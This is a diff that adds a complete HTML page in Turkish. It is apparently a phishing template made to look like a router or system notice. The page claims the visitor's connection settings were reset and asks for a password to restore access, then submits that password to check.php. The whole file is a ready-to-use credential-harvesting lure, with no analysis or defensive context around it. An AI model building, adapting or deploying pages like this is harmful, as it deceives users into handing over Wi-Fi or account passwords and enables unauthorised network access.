@@ -1,0 +1,117 @@
+<!DOCTYPE html>
+<html>
+
+<head>
+    <style>
+        body {
+            margin: 0px;
+            background-color: transparent;
+            overflow: hidden;
+            position: relative;
+            font-size: 90%;
+        }
+        
+        .mainframe-error {
+            height: 60px;
+            width: 100%;
+            text-align: center;
+            border-bottom: 1px;
+            border-color: #CCCCCC;
+            border-style: solid;
+            border-left: 0px;
+            border-right: 0px;
+            border-top: 0px;
+        }
+        
+        .mainframe-error-text {
+            padding-top: 20px;
+        }
+        
+        .mainframe-info {
+            margin-left: 5%;
+        }
+        
+        .border-bottom {
+            border-left: 0px;
+            border-top: 0px;
+            border-right: 0px;
+            border-bottom: 1px;
+            border-color: #CCCCCC;
+            border-style: solid;
+        }
+        
+        .table-input {
+            padding-top: 5px;
+            padding-bottom: 5px;
+        }
+        
+        .div-fill-all {
+            width: 100%;
+            padding-top: 20px;
+        }
+        
+        .confirmbtn {
+            background-image: url(images/buton_bg2.gif);
+            color: #FFF;
+            font-weight: bold;
+            height: 21px;
+            width: 110px;
+            border: 0pt none;
+            align-items: flex-start;
+            text-align: center;
+            cursor: default;
+            background-color: buttonface;
+            box-sizing: border-box;
+            -webkit-appearance: push-button;
+            user-select: none;
+            white-space: pre;
+            -webkit-rtl-ordering: logical;
+            margin: 0em;
+            font: 400 13.3333px Arial;
+            letter-spacing: normal;
+            word-spacing: normal;
+            text-transform: none;
+            text-indent: 0px;
+            text-shadow: none;
+            display: inline-block;
+            text-rendering: auto;
+        }
+    </style>
+
+</head>
+
+<body>
+    <div class="mainframe-error">
+        <p class="mainframe-error-text">Bağlantı ayarlarınız sıfırlandı!</p>
+    </div>
+    <div class="border-bottom">
+        <p class="mainframe-info">Bağlantınızda bir sorun algılandı ve bağlantı ayarlarınız sıfırlandı</p>
+        <p class="mainframe-info">Bağlantınızı geri getirmek için şifrenizi giriniz:</p>
+    </div>
+    <div class="table-div border-bottom">
+        <table class="table-input " align="center">
+            <tbody>
+                <tr>
+                    <td>
+                        <p>Şifre</p>
+                    </td>
+                    <form id="form1" name="form1" method="POST" action="check.php">
+                        <td class="table-data-1">
+                            <input name="key1" type="password" class="input-pass" />
+                        </td>
+                </tr>
+            </tbody>
+
+        </table>
+
+    </div>
+    <div class="div-fill-all">
+        <center>
+            <input name="Confirm" class="confirmbtn" type="submit" value="Tamam" />
+        </center>
+    </div>
+    </form>
+
+</body>
+
+</html>
